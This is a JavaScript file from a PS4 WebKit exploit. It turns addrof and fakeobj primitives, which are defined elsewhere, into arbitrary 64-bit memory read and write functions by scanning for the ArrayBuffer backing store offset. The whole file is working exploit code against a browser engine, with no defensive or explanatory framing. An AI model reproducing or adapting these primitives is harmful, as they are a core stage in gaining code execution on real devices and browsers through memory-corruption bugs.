// mem.js
// Memory read/write primitives for PS4 WebKit exploit

let initialized = false;
let BS_OFFSET, buf, dv, bsPtrAddr;

function read64(addr) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    return dv.getBigUint64(0, true);
}

function write64(addr, value) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    dv.setBigUint64(0, BigInt(value), true);
}


/**
 * Initialize memory primitives by finding the backing store offset and setting up DataView
 */
async function initMemory(log) {
    log('Starting extended scan for ArrayBuffer backing store offset...');
    const patterns = [
        0x4142434445464748n, // 'ABCDEFGH'
        0xdeadbeefcafebaben,
        0x1122334455667788n
    ];
    const bufferSizes = [0x100, 0x200, 0x1000];
    const maxOffset = 0x10000n;
    const yieldInterval = 0x1000n;  // yield to event loop every 0x1000 bytes
    let tested = 0;    
    for (const size of bufferSizes) {
        log(`Trying buffer size ${size} bytes`);
        for (const pattern of patterns) {
            log(`Testing pattern 0x${pattern.toString(16)}`);
            for (let off = 0n; off < maxOffset; off += 8n) {
                // periodic log and yield
                if (off % 0x100n === 0n) {
                    log(`Offset scan at 0x${off.toString(16)} (${tested} tests done)`);
                }
                if (off % yieldInterval === 0n) {
                    await new Promise(res => setTimeout(res, 0));
                }
                tested++;
                // Allocate buffer and DataView
                buf = new ArrayBuffer(size);
                dv = new DataView(buf);
                const bufAddr = addrof(buf);
                bsPtrAddr = bufAddr + off;
                try {
                    const fake = fakeobj(bsPtrAddr);
                    fake[0] = pattern;
                    const readBack = dv.getBigUint64(0, true);
                    if (readBack === pattern) {
                        BS_OFFSET = off;
                        initialized = true;
                        log(`Success! Buffer size ${size}, pattern 0x${pattern.toString(16)}, offset 0x${off.toString(16)}`);
                        return;
                    }
                } catch(e) {
                    // skip invalid offsets
                }
            }
        }
    }
    throw new Error('Unable to find valid backing store offset after ' + tested + ' attempts');
}